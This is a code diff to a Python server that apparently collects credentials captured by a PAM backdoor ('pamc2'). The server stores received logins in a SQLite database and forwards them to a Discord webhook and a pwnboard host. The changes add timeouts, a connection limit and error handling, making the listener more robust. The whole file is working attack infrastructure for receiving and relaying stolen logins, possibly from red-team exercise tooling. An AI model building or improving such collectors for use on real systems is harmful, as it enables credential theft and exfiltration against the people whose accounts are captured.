@@ -6,6 +6,9 @@ import requests
 import threading
 from dotenv import load_dotenv
 
+# Maximum concurrent client handlers to prevent file-descriptor exhaustion
+MAX_CONCURRENT_CLIENTS = int(os.getenv("MAX_CONNS", "200"))
+
 def server_args(cmd_str):
     parser = argparse.ArgumentParser(description="Server meant for use with pamc2")
     parser.add_argument('-p', '--port', metavar="<LISTENING PORT>", help="Port number to listen on (default 5000)", 
@@ -80,7 +83,12 @@ def send_discord(addr, data):
         }]
     }
 
-    response = requests.post(os.getenv('WEBHOOK_URL'), json=hook_data)
+    try:
+        # Add a timeout so threads don't hang forever on outbound HTTP
+        requests.post(os.getenv('WEBHOOK_URL'), json=hook_data, timeout=5)
+    except Exception as e:
+        # Log and continue; do not let this leak sockets or threads
+        print(f"Discord webhook error: {e}")
 
 def write_db(addr, data):
     conn = sqlite3.connect('logins.db')
@@ -165,60 +173,96 @@ def write_db(addr, data):
 
     return retval
 
-def handle_client(lock, c, addr, cmd_args):
-    raw_data = c.recv(1024)
+def handle_client(lock, c, addr, cmd_args, sem: threading.BoundedSemaphore):
+    # Ensure per-connection resources are released even on exceptions
     try:
-        data = raw_data.decode()
-    except UnicodeDecodeError:
-        print("Unicode Decode Error: ")
-        print(f"Raw Data: {raw_data}")
-        c.close()
-        return
+        # Avoid hanging forever on slow or non-speaking clients
+        c.settimeout(10)
+        raw_data = c.recv(1024)
+        try:
+            data = raw_data.decode()
+        except UnicodeDecodeError:
+            print("Unicode Decode Error: ")
+            print(f"Raw Data: {raw_data}")
+            return
 
-    if (not cmd_args.onlynew):
-        print(f"Received from {addr} - {data}")
+        if (not cmd_args.onlynew):
+            # Printing can be interleaved; guard with lock for readability
+            with lock:
+                print(f"Received from {addr} - {data}")
 
-    lock.acquire()
+        retval = 0
+        if (not cmd_args.nodb):
+            # Only guard DB writes with the lock
+            with lock:
+                retval = write_db(addr, data)
+        
+        if (cmd_args.onlynew and retval == 1):
+            with lock:
+                print(f"Received from {addr} - {data}")
 
-    retval = 0
-    if (not cmd_args.nodb):
-        retval = write_db(addr, data)
-    
-    if (cmd_args.onlynew and retval == 1):
-        print(f"Received from {addr} - {data}")
+        # Perform network calls outside of the lock
+        if (cmd_args.discord and (not cmd_args.onlynew or retval == 1)):
+            send_discord(addr, data)
 
-    if (cmd_args.discord and not cmd_args.onlynew):
-        send_discord(addr, data)
-    elif (cmd_args.discord and retval == 1):
-        send_discord(addr, data)
-
-    if (cmd_args.pwnboard and cmd_args.onlynew):
-        send_pwnboard(addr, data, cmd_args.pwnhost)
-    
-    lock.release()
-
-    c.close()
+        if (cmd_args.pwnboard and cmd_args.onlynew):
+            send_pwnboard(addr, data, cmd_args.pwnhost)
+    except socket.timeout:
+        # Client was idle; drop connection
+        pass
+    except Exception as e:
+        print(f"Error handling client {addr}: {e}")
+    finally:
+        try:
+            c.close()
+        except Exception:
+            pass
+        # Release concurrency slot
+        try:
+            sem.release()
+        except Exception:
+            pass
 
 def start_server(cmd_args, stop_event=None):
     server_socket = socket.socket()
+    # Allow quick restart and avoid TIME_WAIT issues
+    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     print("Created socket")
 
     server_socket.bind(('', cmd_args.port))
-    server_socket.listen()
+    server_socket.listen(256)
+    # If we have a stop_event, don't block forever on accept
+    if stop_event is not None:
+        server_socket.settimeout(1.0)
     print(f"Server listening for incoming connections on port {cmd_args.port}...")
 
     lock = threading.Lock()
+    # Limit concurrent client handlers to prevent FD exhaustion
+    sem = threading.BoundedSemaphore(MAX_CONCURRENT_CLIENTS)
 
-    if (not stop_event):
-        while True:
-            client_socket, addr = server_socket.accept()
-            client_thread = threading.Thread(target=handle_client, args=(lock,client_socket,addr,cmd_args))
-            client_thread.start()
-    else:
-        while (not stop_event.is_set()):
-            client_socket, addr = server_socket.accept()
-            client_thread = threading.Thread(target=handle_client, args=(lock,client_socket,addr,cmd_args))
-            client_thread.start()
+    try:
+        if (not stop_event):
+            while True:
+                sem.acquire()
+                client_socket, addr = server_socket.accept()
+                client_thread = threading.Thread(target=handle_client, args=(lock,client_socket,addr,cmd_args,sem), daemon=True)
+                client_thread.start()
+        else:
+            while (not stop_event.is_set()):
+                try:
+                    sem.acquire()
+                    client_socket, addr = server_socket.accept()
+                except socket.timeout:
+                    # Periodically check stop_event
+                    sem.release()
+                    continue
+                client_thread = threading.Thread(target=handle_client, args=(lock,client_socket,addr,cmd_args,sem), daemon=True)
+                client_thread.start()
+    finally:
+        try:
+            server_socket.close()
+        except Exception:
+            pass
 
 def setup(cmd_args=None, stop_event=None):
     load_dotenv()
